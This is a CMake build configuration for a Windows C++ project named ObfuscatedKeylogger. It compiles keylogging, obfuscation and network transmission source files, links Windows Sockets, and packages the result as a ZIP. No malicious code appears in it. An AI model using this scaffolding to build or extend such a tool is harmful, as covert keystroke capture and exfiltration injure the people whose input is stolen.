cmake_minimum_required(VERSION 3.15)

# Project name
project(ObfuscatedKeylogger LANGUAGES CXX)

# Enforce Windows OS
if(NOT WIN32)
    message(FATAL_ERROR "This project only supports Windows.")
endif()

# Enforce x64 or ARM64 architecture
if(NOT CMAKE_GENERATOR_PLATFORM MATCHES "^(x64|ARM64)$" AND NOT CMAKE_SYSTEM_PROCESSOR MATCHES "^(AMD64|x86_64|ARM64|aarch64)$")
    message(FATAL_ERROR "This project only supports Windows x64 and ARM64. Please specify a valid architecture (e.g., -A x64 or -A ARM64).")
endif()

# Set C++ standard to the latest available
set(CMAKE_CXX_STANDARD 23)
set(CMAKE_CXX_STANDARD_REQUIRED ON)
set(CMAKE_CXX_EXTENSIONS OFF)

# Include directories
include_directories(
    ${CMAKE_SOURCE_DIR}/ObfuscatedKeylogger
)

# Source files
set(SOURCE_FILES
    ObfuscatedKeylogger/Keylogger.cpp
    ObfuscatedKeylogger/ObfuscatedKeylogger.cpp
    ObfuscatedKeylogger/Obfuscation.cpp
    ObfuscatedKeylogger/Transmission.cpp
)

# Header files
set(HEADER_FILES
    ObfuscatedKeylogger/Keylogger.h
    ObfuscatedKeylogger/Obfuscation.h
    ObfuscatedKeylogger/Transmission.h
    ObfuscatedKeylogger/resource.h
)

# Resource files (Windows-specific)
set(RESOURCE_FILES
    ObfuscatedKeylogger/ObfuscatedKeylogger.rc
)

# Add executable
add_executable(ObfuscatedKeylogger
    ${SOURCE_FILES}
    ${HEADER_FILES}
    ${RESOURCE_FILES}
)

# Link required libraries
target_link_libraries(ObfuscatedKeylogger
    ws2_32 # Windows Sockets
    kernel32
    user32
    gdi32
)

# Output directory based on architecture
if(CMAKE_GENERATOR_PLATFORM STREQUAL "ARM64" OR CMAKE_SYSTEM_PROCESSOR MATCHES "^(ARM64|aarch64)$")
    set(ARCH_DIR "arm64")
else()
    set(ARCH_DIR "x64")
endif()

set_target_properties(ObfuscatedKeylogger PROPERTIES
    RUNTIME_OUTPUT_DIRECTORY ${CMAKE_SOURCE_DIR}/Release/${ARCH_DIR}/Release
)

# Packaging (Optional: Create a ZIP with executables and dependencies)
set(CPACK_GENERATOR "ZIP")
set(CPACK_ARCHIVE_FILE_NAME "ObfuscatedKeylogger")
include(CPack)